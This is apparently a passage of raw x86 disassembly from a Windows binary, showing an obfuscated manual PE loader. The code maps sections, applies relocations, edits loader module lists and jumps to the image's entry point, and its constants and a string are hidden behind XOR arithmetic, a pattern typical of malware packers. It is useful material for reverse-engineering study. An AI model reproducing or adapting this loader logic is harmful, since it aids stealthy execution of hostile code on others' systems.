  421914:	mov    eax,DWORD PTR [ebp+0xc]
  421917:	mov    DWORD PTR [ebp+0xc],eax
  42191a:	push   esi
  42191b:	mov    eax,eax
  42191d:	mov    eax,DWORD PTR [ebp-0x4]
  421920:	mov    esi,DWORD PTR [ebp+0x8]
  421923:	mov    ecx,0x75108b3
  421928:	xor    eax,ecx
  42192a:	mov    edx,0x3272fa
  42192f:	add    eax,edx
  421931:	cmp    esi,eax
  421933:	je     0x421a5a
  421939:	mov    eax,DWORD PTR [ebp+0x8]
  42193c:	mov    esi,DWORD PTR [ebp+0x8]
  42193f:	add    esi,DWORD PTR [eax+0x3c]
  421942:	push   edi
  421943:	mov    DWORD PTR [ebp+0xc],esi
  421946:	mov    DWORD PTR [ebp-0x1c],0xf89c85b8
  42194d:	mov    eax,DWORD PTR [ebp-0x1c]
  421950:	mov    esi,DWORD PTR [ebp-0x4]
  421953:	mov    edi,DWORD PTR [ebp+0xc]
  421956:	xor    esi,ecx
  421958:	xor    eax,ecx
  42195a:	add    esi,edx
  42195c:	cmp    DWORD PTR [edi+eax*8+0x1939848],esi
  421963:	je     0x421a54
  421969:	mov    esi,DWORD PTR [ebp+0xc]
  42196c:	mov    eax,DWORD PTR [ebp+0x8]
  42196f:	add    eax,DWORD PTR [esi+0xa0]
  421975:	mov    esi,DWORD PTR [ebp+0x8]
  421978:	mov    edi,DWORD PTR [ebp+0xc]
  42197b:	sub    esi,DWORD PTR [edi+0x34]
  42197e:	mov    edi,DWORD PTR [ebp-0x4]
  421981:	xor    edi,ecx
  421983:	add    edi,edx
  421985:	mov    DWORD PTR [ebp-0x24],esi
  421988:	cmp    esi,edi
  42198a:	je     0x421a54
  421990:	mov    esi,DWORD PTR [ebp-0x4]
  421993:	xor    esi,ecx
  421995:	add    esi,edx
  421997:	mov    DWORD PTR [ebp-0x8],esi
  42199a:	push   ebx
  42199b:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  4219a2:	jmp    0x421a3e
  4219a7:	mov    esi,DWORD PTR [ebp-0x4]
  4219aa:	xor    esi,ecx
  4219ac:	lea    edi,[ebx-0x8]
  4219af:	add    esi,edx
  4219b1:	shr    edi,1
  4219b3:	cmp    esi,edi
  4219b5:	jae    0x421a24
  4219b7:	sub    edi,esi
  4219b9:	lea    ebx,[eax+esi*2+0x8]
  4219bd:	mov    DWORD PTR [ebp-0x18],edi
  4219c0:	movzx  esi,WORD PTR [ebx]
  4219c3:	and    esi,0xfff
  4219c9:	mov    DWORD PTR [ebp-0x14],esi
  4219cc:	mov    edi,DWORD PTR [ebp-0x14]
  4219cf:	mov    esi,DWORD PTR [eax]
  4219d1:	sub    esi,edx
  4219d3:	add    edi,esi
  4219d5:	movzx  esi,WORD PTR [ebx]
  4219d8:	shr    esi,0xc
  4219db:	xor    edi,ecx
  4219dd:	mov    DWORD PTR [ebp-0x20],edi
  4219e0:	mov    DWORD PTR [ebp-0x14],esi
  4219e3:	mov    esi,DWORD PTR [ebp-0x20]
  4219e6:	mov    edi,DWORD PTR [ebp+0x8]
  4219e9:	xor    esi,ecx
  4219eb:	lea    esi,[esi+edi*1+0x3272fa]
  4219f2:	mov    DWORD PTR [ebp-0x20],esi
  4219f5:	mov    esi,DWORD PTR [ebp-0x10]
  4219f8:	mov    edi,DWORD PTR [ebp-0x14]
  4219fb:	xor    esi,ecx
  4219fd:	add    esi,edx
  4219ff:	cmp    edi,esi
  421a01:	jne    0x421a19
  421a03:	mov    esi,DWORD PTR [ebp-0x10]
  421a06:	mov    edi,DWORD PTR [ebp-0x14]
  421a09:	xor    esi,ecx
  421a0b:	add    esi,edx
  421a0d:	cmp    edi,esi
  421a0f:	jne    0x421a19
  421a11:	mov    esi,DWORD PTR [ebp-0x20]
  421a14:	mov    edi,DWORD PTR [ebp-0x24]
  421a17:	add    DWORD PTR [esi],edi
  421a19:	add    ebx,0x2
  421a1c:	dec    DWORD PTR [ebp-0x18]
  421a1f:	jne    0x4219c0
  421a21:	mov    ebx,DWORD PTR [ebp-0xc]
  421a24:	add    DWORD PTR [ebp-0x8],ebx
  421a27:	mov    esi,DWORD PTR [ebp-0x1c]
  421a2a:	mov    edi,DWORD PTR [ebp-0x8]
  421a2d:	mov    ebx,DWORD PTR [ebp+0xc]
  421a30:	xor    esi,ecx
  421a32:	cmp    edi,DWORD PTR [ebx+esi*8+0x193984c]
  421a39:	jae    0x421a53
  421a3b:	add    eax,DWORD PTR [ebp-0xc]
  421a3e:	mov    esi,DWORD PTR [ebp-0x4]
  421a41:	mov    ebx,DWORD PTR [eax+0x4]
  421a44:	xor    esi,ecx
  421a46:	add    esi,edx
  421a48:	mov    DWORD PTR [ebp-0xc],ebx
  421a4b:	cmp    ebx,esi
  421a4d:	jne    0x4219a7
  421a53:	pop    ebx
  421a54:	mov    eax,DWORD PTR [ebp-0x28]
  421a57:	pop    edi
  421a58:	jmp    0x421a5d
  421a5a:	mov    eax,DWORD PTR [ebp-0x4]
  421a5d:	xor    eax,ecx
  421a5f:	add    eax,edx
  421a61:	pop    esi
  421a62:	leave  
  421a63:	ret    0x8
  421a66:	push   ebp
  421a67:	mov    ebp,esp
  421a69:	sub    esp,0xd8
  421a6f:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  421a76:	mov    DWORD PTR [ebp-0x24],0xf89c85b4
  421a7d:	mov    eax,DWORD PTR [ebp-0x4]
  421a80:	push   ebx
  421a81:	push   esi
  421a82:	mov    esi,0x75108b3
  421a87:	xor    eax,esi
  421a89:	push   edi
  421a8a:	mov    edi,0x3272fa
  421a8f:	add    eax,edi
  421a91:	mov    DWORD PTR [ebp-0x18],eax
  421a94:	mov    eax,DWORD PTR [ebp-0x4]
  421a97:	xor    eax,esi
  421a99:	add    eax,edi
  421a9b:	mov    DWORD PTR [ebp-0x8],eax
  421a9e:	mov    ebx,DWORD PTR [ebp+0x20]
  421aa1:	mov    eax,DWORD PTR [ebp-0x1c]
  421aa4:	mov    ecx,DWORD PTR [ebp-0x1c]
  421aa7:	xor    eax,ecx
  421aa9:	mov    DWORD PTR [ebp-0x1c],eax
  421aac:	add    DWORD PTR [ebp-0x1c],0xf89cb5b5
  421ab3:	mov    eax,DWORD PTR [ebp-0xc]
  421ab6:	mov    ecx,DWORD PTR [ebp-0xc]
  421ab9:	xor    eax,ecx
  421abb:	mov    DWORD PTR [ebp-0xc],eax
  421abe:	add    DWORD PTR [ebp-0xc],0xf89c85f5
  421ac5:	mov    eax,DWORD PTR [ebp-0x10]
  421ac8:	mov    ecx,DWORD PTR [ebp-0x10]
  421acb:	xor    eax,ecx
  421acd:	mov    DWORD PTR [ebp-0x10],eax
  421ad0:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  421ad7:	mov    eax,DWORD PTR [ebp-0x28]
  421ada:	mov    ecx,DWORD PTR [ebp-0x28]
  421add:	xor    eax,ecx
  421adf:	mov    DWORD PTR [ebp-0x28],eax
  421ae2:	add    DWORD PTR [ebp-0x28],0xf89f05b5
  421ae9:	mov    DWORD PTR [ebp+0x20],0xf89cefe0
  421af0:	mov    eax,DWORD PTR [ebp+0x8]
  421af3:	test   eax,eax
  421af5:	je     0x421f7c
  421afb:	mov    eax,DWORD PTR [ebp+0xc]
  421afe:	test   eax,eax
  421b00:	je     0x421f7c
  421b06:	mov    eax,DWORD PTR [ebp+0x18]
  421b09:	test   eax,eax
  421b0b:	je     0x421f7c
  421b11:	mov    eax,DWORD PTR [ebp+0x20]
  421b14:	mov    ecx,DWORD PTR [ebp+0x8]
  421b17:	xor    eax,0x8b3
  421b1c:	add    eax,0x72fa
  421b21:	cmp    WORD PTR [ecx],ax
  421b24:	jne    0x421f7c
  421b2a:	mov    eax,DWORD PTR [ebp-0x4]
  421b2d:	xor    eax,esi
  421b2f:	add    eax,edi
  421b31:	mov    DWORD PTR [ebp-0x30],eax
  421b34:	mov    eax,DWORD PTR [ebp-0x4]
  421b37:	mov    ecx,DWORD PTR [ebp+0x8]
  421b3a:	mov    eax,DWORD PTR [ebp+0x8]
  421b3d:	add    eax,DWORD PTR [ecx+0x3c]
  421b40:	mov    DWORD PTR [ebp+0xc],eax
  421b43:	mov    eax,DWORD PTR [eax+0x50]
  421b46:	test   eax,eax
  421b48:	je     0x421f7c
  421b4e:	mov    DWORD PTR [ebp-0x2c],0xf88c85b5
  421b55:	mov    eax,DWORD PTR [ebp-0x2c]
  421b58:	xor    eax,esi
  421b5a:	add    eax,edi
  421b5c:	mov    DWORD PTR [ebp-0x2c],eax
  421b5f:	mov    eax,DWORD PTR [ebp-0x4]
  421b62:	mov    eax,DWORD PTR [ebx+0x190]
  421b68:	mov    ecx,DWORD PTR [eax]
  421b6a:	mov    ecx,DWORD PTR [ecx+0x3c]
  421b6d:	add    ecx,DWORD PTR [eax]
  421b6f:	mov    eax,DWORD PTR [ebp-0x4]
  421b72:	mov    eax,DWORD PTR [ebx+0x18c]
  421b78:	mov    edx,DWORD PTR [eax]
  421b7a:	mov    DWORD PTR [ebp-0x20],ecx
  421b7d:	mov    DWORD PTR [ebp+0x20],edx
  421b80:	cmp    edx,edx
  421b82:	jne    0x421bb6
  421b84:	mov    eax,DWORD PTR [ebx+0x1e0]
  421b8a:	lea    edx,[ebp-0x18]
  421b8d:	push   edx
  421b8e:	mov    edx,DWORD PTR [ebp-0xc]
  421b91:	xor    edx,esi
  421b93:	add    edx,edi
  421b95:	push   edx
  421b96:	push   DWORD PTR [ecx+0x50]
  421b99:	push   DWORD PTR [ebp+0x20]
  421b9c:	call   DWORD PTR [eax+0x1c]
  421b9f:	mov    eax,DWORD PTR [ebp-0x20]
  421ba2:	mov    ecx,DWORD PTR [eax+0x54]
  421ba5:	mov    eax,DWORD PTR [eax+0x50]
  421ba8:	sub    eax,ecx
  421baa:	add    ecx,DWORD PTR [ebp+0x20]
  421bad:	push   ecx
  421bae:	call   0x422519
  421bb3:	mov    edx,DWORD PTR [ebp+0x20]
  421bb6:	mov    eax,DWORD PTR [ebx+0x194]
  421bbc:	mov    DWORD PTR [eax],edx
  421bbe:	mov    eax,DWORD PTR [ebp+0xc]
  421bc1:	push   DWORD PTR [eax+0x54]
  421bc4:	push   DWORD PTR [ebp+0x8]
  421bc7:	push   edx
  421bc8:	call   0x42240f
  421bcd:	mov    ecx,DWORD PTR [ebp+0x20]
  421bd0:	mov    eax,DWORD PTR [ecx+0x3c]
  421bd3:	add    eax,ecx
  421bd5:	movzx  ecx,WORD PTR [eax+0x14]
  421bd9:	lea    ecx,[ecx+eax*1+0x18]
  421bdd:	mov    DWORD PTR [ebp+0x18],ecx
  421be0:	mov    ecx,DWORD PTR [ebp-0x4]
  421be3:	movzx  edx,WORD PTR [eax+0x6]
  421be7:	xor    ecx,esi
  421be9:	add    ecx,edi
  421beb:	mov    DWORD PTR [ebp+0xc],eax
  421bee:	cmp    edx,ecx
  421bf0:	je     0x421c9d
  421bf6:	mov    ecx,DWORD PTR [ebp-0x4]
  421bf9:	xor    ecx,esi
  421bfb:	add    ecx,edi
  421bfd:	mov    DWORD PTR [ebp-0x8],ecx
  421c00:	mov    ecx,DWORD PTR [ebp-0x24]
  421c03:	movzx  edx,WORD PTR [eax+0x6]
  421c07:	xor    ecx,esi
  421c09:	sub    edx,ecx
  421c0b:	sub    edx,edi
  421c0d:	cmp    DWORD PTR [ebp-0x8],edx
  421c10:	ja     0x421c9d
  421c16:	mov    edx,DWORD PTR [ebp+0x18]
  421c19:	add    edx,0x8
  421c1c:	mov    DWORD PTR [ebp+0x18],edx
  421c1f:	jmp    0x421c24
  421c21:	mov    edx,DWORD PTR [ebp+0x18]
  421c24:	mov    eax,DWORD PTR [eax+0x38]
  421c27:	lea    ecx,[eax-0x1]
  421c2a:	mov    DWORD PTR [ebp-0x38],eax
  421c2d:	mov    eax,DWORD PTR [edx]
  421c2f:	test   eax,ecx
  421c31:	je     0x421c3a
  421c33:	not    ecx
  421c35:	and    eax,ecx
  421c37:	add    eax,DWORD PTR [ebp-0x38]
  421c3a:	mov    ecx,DWORD PTR [edx+0x4]
  421c3d:	add    ecx,DWORD PTR [ebp+0x20]
  421c40:	push   ecx
  421c41:	call   0x422519
  421c46:	mov    edx,DWORD PTR [ebp-0x4]
  421c49:	mov    eax,DWORD PTR [ebp+0x18]
  421c4c:	mov    ecx,DWORD PTR [eax+0x8]
  421c4f:	xor    edx,esi
  421c51:	add    edx,edi
  421c53:	cmp    ecx,edx
  421c55:	je     0x421c6e
  421c57:	push   ecx
  421c58:	mov    ecx,DWORD PTR [ebp+0x8]
  421c5b:	add    ecx,DWORD PTR [eax+0xc]
  421c5e:	mov    eax,DWORD PTR [eax+0x4]
  421c61:	add    eax,DWORD PTR [ebp+0x20]
  421c64:	push   ecx
  421c65:	push   eax
  421c66:	call   0x42240f
  421c6b:	mov    eax,DWORD PTR [ebp+0x18]
  421c6e:	mov    ecx,DWORD PTR [ebp-0x24]
  421c71:	mov    edx,DWORD PTR [ebp-0x8]
  421c74:	add    eax,0x28
  421c77:	xor    ecx,esi
  421c79:	lea    ecx,[edx+ecx*1+0x3272fa]
  421c80:	mov    edx,DWORD PTR [ebp+0xc]
  421c83:	mov    DWORD PTR [ebp+0x18],eax
  421c86:	mov    eax,DWORD PTR [ebp-0x24]
  421c89:	movzx  edx,WORD PTR [edx+0x6]
  421c8d:	xor    eax,esi
  421c8f:	sub    edx,eax
  421c91:	mov    eax,DWORD PTR [ebp+0xc]
  421c94:	sub    edx,edi
  421c96:	mov    DWORD PTR [ebp-0x8],ecx
  421c99:	cmp    ecx,edx
  421c9b:	jbe    0x421c21
  421c9d:	mov    edx,DWORD PTR [ebx+0x18c]
  421ca3:	mov    ecx,DWORD PTR [ebp+0x20]
  421ca6:	cmp    ecx,DWORD PTR [edx]
  421ca8:	jne    0x421cd1
  421caa:	mov    eax,DWORD PTR [ebx+0x1e0]
  421cb0:	lea    edx,[ebp-0x18]
  421cb3:	push   edx
  421cb4:	mov    edx,DWORD PTR [ebp-0x10]
  421cb7:	xor    edx,esi
  421cb9:	add    edx,edi
  421cbb:	push   edx
  421cbc:	mov    edx,DWORD PTR [ebp-0x20]
  421cbf:	push   DWORD PTR [edx+0x54]
  421cc2:	push   ecx
  421cc3:	call   DWORD PTR [eax+0x1c]
  421cc6:	test   eax,eax
  421cc8:	je     0x421f6d
  421cce:	mov    eax,DWORD PTR [ebp+0xc]
  421cd1:	mov    ecx,DWORD PTR [ebx+0x1c8]
  421cd7:	mov    ecx,DWORD PTR [ecx]
  421cd9:	xor    ecx,esi
  421cdb:	add    ecx,edi
  421cdd:	je     0x421e98
  421ce3:	mov    eax,DWORD PTR [ebp-0x4]
  421ce6:	xor    eax,esi
  421ce8:	add    eax,edi
  421cea:	and    DWORD PTR [ebp+0x8],0x0
  421cee:	mov    DWORD PTR [ebp-0x14],eax
  421cf1:	mov    eax,0xf89c85d9
  421cf6:	lea    ecx,[eax-0x18]
  421cf9:	mov    DWORD PTR [ebp-0x58],0xf89c85c7
  421d00:	mov    DWORD PTR [ebp-0x54],0xf89c85c9
  421d07:	mov    DWORD PTR [ebp-0x50],eax
  421d0a:	mov    DWORD PTR [ebp-0x4c],ecx
  421d0d:	mov    DWORD PTR [ebp-0x48],ecx
  421d10:	mov    DWORD PTR [ebp-0x44],0xf89c85b5
  421d17:	mov    edx,DWORD PTR [ebp+0x8]
  421d1a:	mov    ecx,0x8b3
  421d1f:	xor    cx,WORD PTR [ebp+edx*4-0x58]
  421d24:	mov    edx,0x72fa
  421d29:	add    cx,dx
  421d2c:	mov    edx,DWORD PTR [ebp+0x8]
  421d2f:	inc    DWORD PTR [ebp+0x8]
  421d32:	cmp    DWORD PTR [ebp+0x8],0x6
  421d36:	mov    WORD PTR [ebp+edx*2-0xc0],cx
  421d3e:	jb     0x421d17
  421d40:	mov    ecx,0xf89c85cb
  421d45:	mov    DWORD PTR [ebp-0xb0],eax
  421d4b:	mov    DWORD PTR [ebp-0x9c],eax
  421d51:	mov    DWORD PTR [ebp-0x74],eax
  421d54:	mov    DWORD PTR [ebp-0x70],eax
  421d57:	lea    eax,[ecx-0x1]
  421d5a:	lea    edx,[ecx+0x34]
  421d5d:	mov    DWORD PTR [ebp-0x64],eax
  421d60:	mov    DWORD PTR [ebp-0x60],eax
  421d63:	mov    DWORD PTR [ebp-0xb4],0xf89c85e1
  421d6d:	mov    DWORD PTR [ebp-0xac],ecx
  421d73:	mov    DWORD PTR [ebp-0xa8],edx
  421d79:	mov    DWORD PTR [ebp-0xa4],0xf89c85dc
  421d83:	mov    DWORD PTR [ebp-0xa0],0xf89c85c7
  421d8d:	mov    DWORD PTR [ebp-0x98],0xf89c85f8
  421d97:	mov    DWORD PTR [ebp-0x94],0xf89c85c7
  421da1:	mov    DWORD PTR [ebp-0x90],0xf89c85c9
  421dab:	mov    DWORD PTR [ebp-0x8c],ecx
  421db1:	mov    DWORD PTR [ebp-0x88],0xf89c85cc
  421dbb:	mov    DWORD PTR [ebp-0x84],edx
  421dc1:	mov    DWORD PTR [ebp-0x80],0xf89c85c6
  421dc8:	mov    DWORD PTR [ebp-0x7c],ecx
  421dcb:	mov    DWORD PTR [ebp-0x78],0xf89c85f4
  421dd2:	mov    DWORD PTR [ebp-0x6c],ecx
  421dd5:	mov    DWORD PTR [ebp-0x68],0xf89c85d8
  421ddc:	mov    DWORD PTR [ebp-0x5c],0xf89c85b5
  421de3:	xor    eax,eax
  421de5:	mov    cl,BYTE PTR [ebp+eax*4-0xb4]
  421dec:	xor    cl,0xb3
  421def:	sub    cl,0x6
  421df2:	mov    BYTE PTR [ebp+eax*1-0xd8],cl
  421df9:	inc    eax
  421dfa:	cmp    eax,0x17
  421dfd:	jb     0x421de5
  421dff:	mov    eax,DWORD PTR [ebx+0x1e0]
  421e05:	lea    ecx,[ebp-0xc0]
  421e0b:	push   ecx
  421e0c:	call   DWORD PTR [eax+0x4]
  421e0f:	mov    ecx,DWORD PTR [ebx+0x1e0]
  421e15:	lea    edx,[ebp-0xd8]
  421e1b:	push   edx
  421e1c:	push   eax
  421e1d:	call   DWORD PTR [ecx+0x8]
  421e20:	mov    DWORD PTR [ebp-0x40],eax
  421e23:	lea    eax,[ebp-0x14]
  421e26:	push   eax
  421e27:	mov    eax,DWORD PTR [ebx+0x18c]
  421e2d:	push   DWORD PTR [eax]
  421e2f:	mov    eax,DWORD PTR [ebp-0x40]
  421e32:	call   eax
  421e34:	mov    eax,DWORD PTR [ebp-0x4]
  421e37:	xor    eax,esi
  421e39:	add    eax,edi
  421e3b:	mov    DWORD PTR [ebp-0x34],eax
  421e3e:	mov    ecx,DWORD PTR [ebp-0x4]
  421e41:	mov    eax,DWORD PTR [ebp-0x14]
  421e44:	xor    ecx,esi
  421e46:	add    ecx,edi
  421e48:	cmp    eax,ecx
  421e4a:	je     0x421e95
  421e4c:	mov    DWORD PTR [ebp-0x3c],eax
  421e4f:	jmp    0x421e60
  421e51:	mov    eax,DWORD PTR [eax]
  421e53:	mov    ecx,DWORD PTR [ebp-0x3c]
  421e56:	mov    DWORD PTR [ebp-0x14],eax
  421e59:	mov    eax,DWORD PTR [ebp-0x14]
  421e5c:	cmp    eax,ecx
  421e5e:	je     0x421e6d
  421e60:	mov    edx,DWORD PTR [eax+0x18]
  421e63:	mov    ecx,DWORD PTR [ebx+0x18c]
  421e69:	cmp    edx,DWORD PTR [ecx]
  421e6b:	jne    0x421e51
  421e6d:	mov    ecx,DWORD PTR [ebx+0x18c]
  421e73:	mov    edx,DWORD PTR [eax+0x18]
  421e76:	cmp    edx,DWORD PTR [ecx]
  421e78:	jne    0x421e95
  421e7a:	mov    ecx,DWORD PTR [ebx+0x190]
  421e80:	mov    edx,DWORD PTR [ebp-0x20]
  421e83:	mov    edx,DWORD PTR [edx+0x28]
  421e86:	add    edx,DWORD PTR [ecx]
  421e88:	mov    DWORD PTR [eax+0x1c],edx
  421e8b:	mov    eax,DWORD PTR [ebp-0x24]
  421e8e:	xor    eax,esi
  421e90:	add    eax,edi
  421e92:	mov    DWORD PTR [ebp-0x34],eax
  421e95:	mov    eax,DWORD PTR [ebp+0xc]
  421e98:	push   ebx
  421e99:	push   eax
  421e9a:	push   DWORD PTR [ebp+0x20]
  421e9d:	call   0x42161d
  421ea2:	test   eax,eax
  421ea4:	je     0x421f6d
  421eaa:	push   DWORD PTR [ebp+0xc]
  421ead:	mov    ecx,ebx
  421eaf:	push   DWORD PTR [ebp+0x20]
  421eb2:	call   0x421576
  421eb7:	test   eax,eax
  421eb9:	je     0x421f6d
  421ebf:	mov    eax,DWORD PTR [ebp+0xc]
  421ec2:	mov    edx,DWORD PTR [ebp+0x20]
  421ec5:	mov    ecx,ebx
  421ec7:	call   0x42144f
  421ecc:	test   eax,eax
  421ece:	je     0x421f6d
  421ed4:	push   ebx
  421ed5:	push   DWORD PTR [ebp+0x20]
  421ed8:	call   0x421900
  421edd:	test   eax,eax
  421edf:	je     0x421f6d
  421ee5:	mov    eax,DWORD PTR [ebx+0x18c]
  421eeb:	mov    edx,DWORD PTR [ebp+0x20]
  421eee:	cmp    edx,DWORD PTR [eax]
  421ef0:	jne    0x421f0c
  421ef2:	mov    eax,DWORD PTR [ebx+0x1e0]
  421ef8:	lea    ecx,[ebp-0x18]
  421efb:	push   ecx
  421efc:	push   DWORD PTR [ebp-0x18]
  421eff:	mov    ecx,DWORD PTR [ebp-0x20]
  421f02:	push   DWORD PTR [ecx+0x54]
  421f05:	push   edx
  421f06:	call   DWORD PTR [eax+0x1c]
  421f09:	mov    edx,DWORD PTR [ebp+0x20]
  421f0c:	mov    eax,DWORD PTR [ebx+0x1c8]
  421f12:	mov    eax,DWORD PTR [eax]
  421f14:	xor    eax,esi
  421f16:	add    eax,edi
  421f18:	je     0x421f51
  421f1a:	mov    ecx,DWORD PTR [ebp+0xc]
  421f1d:	mov    eax,DWORD PTR [ecx+0x28]
  421f20:	mov    DWORD PTR [ebp+0x8],0xf89ca5b5
  421f27:	mov    esi,DWORD PTR [ebp+0x8]
  421f2a:	push   DWORD PTR [ebp+0x14]
  421f2d:	xor    esi,0x8b3
  421f33:	push   DWORD PTR [ebp+0x10]
  421f36:	add    esi,0x72fa
  421f3c:	or     WORD PTR [ecx+0x16],si
  421f40:	add    eax,edx
  421f42:	push   edx
  421f43:	call   eax
  421f45:	mov    DWORD PTR [ebx+0x1d0],0xf89c85b4
  421f4f:	jmp    0x421f5b
  421f51:	mov    eax,DWORD PTR [ebp+0xc]
  421f54:	mov    eax,DWORD PTR [eax+0x28]
  421f57:	add    eax,edx
  421f59:	call   eax
  421f5b:	mov    DWORD PTR [ebp-0x8],eax
  421f5e:	mov    eax,DWORD PTR [ebp-0x8]
  421f61:	mov    ecx,DWORD PTR [ebp+0x1c]
  421f64:	mov    DWORD PTR [ecx],eax
  421f66:	mov    DWORD PTR [ebp-0x30],0x1
  421f6d:	cmp    DWORD PTR [ebp-0x30],0x0
  421f71:	jne    0x421f77
  421f73:	and    DWORD PTR [ebp+0x20],0x0
  421f77:	mov    eax,DWORD PTR [ebp+0x20]
  421f7a:	jmp    0x421f7e
  421f7c:	xor    eax,eax
  421f7e:	pop    edi
  421f7f:	pop    esi
  421f80:	pop    ebx
  421f81:	leave  
  421f82:	ret    0x1c
  421f85:	push   ebp
  421f86:	mov    ebp,esp
  421f88:	movzx  edx,WORD PTR [ecx+0x6]
  421f8c:	movzx  eax,WORD PTR [ecx+0x14]
  421f90:	push   ebx
  421f91:	push   edi
  421f92:	xor    edi,edi
  421f94:	lea    eax,[eax+ecx*1+0x18]
  421f98:	test   edx,edx
  421f9a:	je     0x421fbb
  421f9c:	mov    ecx,DWORD PTR [eax+0xc]
  421f9f:	lea    ebx,[ecx+esi*1]
  421fa2:	cmp    DWORD PTR [ebp+0x8],ebx
  421fa5:	jb     0x421fb3
  421fa7:	mov    ebx,DWORD PTR [eax+0x8]
  421faa:	add    ebx,ecx
  421fac:	add    ebx,esi
  421fae:	cmp    DWORD PTR [ebp+0x8],ebx
  421fb1:	jb     0x421fbd
  421fb3:	add    eax,0x28
  421fb6:	inc    edi
  421fb7:	cmp    edi,edx
  421fb9:	jb     0x421f9c
  421fbb:	xor    eax,eax
  421fbd:	pop    edi
  421fbe:	pop    ebx
  421fbf:	pop    ebp
  421fc0:	ret    0x4
  421fc3:	push   ebp
  421fc4:	mov    ebp,esp
  421fc6:	sub    esp,0x34
  421fc9:	mov    DWORD PTR [ebp-0xc],0xf89c85b5
  421fd0:	mov    DWORD PTR [ebp-0x18],0xf89c85b4
  421fd7:	mov    DWORD PTR [ebp-0x1c],0xf89c85bb
  421fde:	mov    DWORD PTR [ebp-0x8],0xf89c85d4
  421fe5:	mov    DWORD PTR [ebp-0x20],0xf89c85f4
  421fec:	mov    DWORD PTR [ebp-0x2c],0xf89c8533
  421ff3:	mov    DWORD PTR [ebp-0x2c],0xf89c85d3
  421ffa:	mov    DWORD PTR [ebp-0x10],eax
  421ffd:	mov    eax,DWORD PTR [ebp+0x8]
  422000:	mov    DWORD PTR [ebp-0x14],eax
  422003:	mov    eax,DWORD PTR [ebp-0xc]
  422006:	push   ebx
  422007:	mov    ecx,0x75108b3
  42200c:	xor    eax,ecx
  42200e:	push   esi
  42200f:	mov    esi,DWORD PTR [ebp-0x10]
  422012:	mov    edx,0x3272fa
  422017:	add    eax,edx
  422019:	push   edi
  42201a:	cmp    esi,eax
  42201c:	je     0x4221fb
  422022:	mov    eax,DWORD PTR [ebp-0xc]
  422025:	mov    esi,DWORD PTR [ebp-0x14]
  422028:	xor    eax,ecx
  42202a:	add    eax,edx
  42202c:	cmp    esi,eax
  42202e:	je     0x4221fb
  422034:	mov    eax,DWORD PTR [ebp-0xc]
  422037:	xor    eax,ecx
  422039:	add    eax,edx
  42203b:	mov    DWORD PTR [ebp-0x24],eax
  42203e:	mov    eax,DWORD PTR [ebp-0xc]
  422041:	xor    eax,ecx
  422043:	add    eax,edx
  422045:	mov    DWORD PTR [ebp-0x28],eax
  422048:	mov    edi,DWORD PTR [ebp-0x20]
  42204b:	mov    ebx,DWORD PTR [ebp-0x8]
  42204e:	mov    esi,0x8b3
  422053:	xor    edi,esi
  422055:	mov    eax,0x72fa
  42205a:	xor    ebx,esi
  42205c:	add    edi,eax
  42205e:	add    ebx,eax
  422060:	sub    ebx,edi
  422062:	mov    WORD PTR [ebp-0x8],bx
  422066:	jmp    0x42212b
  42206b:	mov    edi,DWORD PTR [ebp-0xc]
  42206e:	mov    bx,WORD PTR [ebp-0x4]
  422072:	xor    edi,esi
  422074:	add    edi,eax
  422076:	cmp    bx,di
  422079:	je     0x42216d
  42207f:	mov    edi,DWORD PTR [ebp-0xc]
  422082:	mov    ebx,DWORD PTR [ebp+0xc]
  422085:	xor    edi,ecx
  422087:	add    edi,edx
  422089:	cmp    ebx,edi
  42208b:	mov    di,WORD PTR [ebp-0x4]
  42208f:	mov    bx,WORD PTR [ebp+0x8]
  422093:	je     0x4220fe
  422095:	cmp    bx,di
  422098:	je     0x422107
  42209a:	mov    edi,DWORD PTR [ebp-0x20]
  42209d:	mov    bx,WORD PTR [ebp+0x8]
  4220a1:	xor    edi,esi
  4220a3:	add    edi,eax
  4220a5:	cmp    bx,di
  4220a8:	jb     0x4220c8
  4220aa:	mov    edi,DWORD PTR [ebp-0x2c]
  4220ad:	mov    bx,WORD PTR [ebp+0x8]
  4220b1:	xor    edi,esi
  4220b3:	add    edi,eax
  4220b5:	cmp    bx,di
  4220b8:	ja     0x4220c8
  4220ba:	movzx  edi,WORD PTR [ebp+0x8]
  4220be:	movzx  ebx,WORD PTR [ebp-0x8]
  4220c2:	add    edi,ebx
  4220c4:	mov    WORD PTR [ebp+0x8],di
  4220c8:	mov    edi,DWORD PTR [ebp-0x20]
  4220cb:	mov    bx,WORD PTR [ebp-0x4]
  4220cf:	xor    edi,esi
  4220d1:	add    edi,eax
  4220d3:	cmp    bx,di
  4220d6:	jb     0x4220f6
  4220d8:	mov    edi,DWORD PTR [ebp-0x2c]
  4220db:	mov    bx,WORD PTR [ebp-0x4]
  4220df:	xor    edi,esi
  4220e1:	add    edi,eax
  4220e3:	cmp    bx,di
  4220e6:	ja     0x4220f6
  4220e8:	movzx  edi,WORD PTR [ebp-0x4]
  4220ec:	movzx  ebx,WORD PTR [ebp-0x8]
  4220f0:	add    edi,ebx
  4220f2:	mov    WORD PTR [ebp-0x4],di
  4220f6:	mov    di,WORD PTR [ebp-0x4]
  4220fa:	mov    bx,WORD PTR [ebp+0x8]
  4220fe:	cmp    bx,di
  422101:	jne    0x4221fb
  422107:	mov    edi,DWORD PTR [ebp-0x1c]
  42210a:	mov    ebx,DWORD PTR [ebp-0x10]
  42210d:	xor    edi,ecx
  42210f:	lea    edi,[edi+ebx*1+0x3272fa]
  422116:	mov    DWORD PTR [ebp-0x10],edi
  422119:	mov    edi,DWORD PTR [ebp-0x1c]
  42211c:	mov    ebx,DWORD PTR [ebp-0x14]
  42211f:	xor    edi,ecx
  422121:	lea    edi,[edi+ebx*1+0x3272fa]
  422128:	mov    DWORD PTR [ebp-0x14],edi
  42212b:	mov    edi,DWORD PTR [ebp-0x24]
  42212e:	mov    ebx,DWORD PTR [ebp-0x10]
  422131:	mov    di,WORD PTR [ebx+edi*2]
  422135:	mov    WORD PTR [ebp+0x8],di
  422139:	mov    edi,DWORD PTR [ebp-0x28]
  42213c:	mov    ebx,DWORD PTR [ebp-0x14]
  42213f:	mov    di,WORD PTR [ebx+edi*2]
  422143:	mov    WORD PTR [ebp-0x4],di
  422147:	mov    edi,DWORD PTR [ebp-0xc]
  42214a:	mov    bx,WORD PTR [ebp+0x8]
  42214e:	xor    edi,esi
  422150:	add    edi,eax
  422152:	cmp    bx,di
  422155:	jne    0x42206b
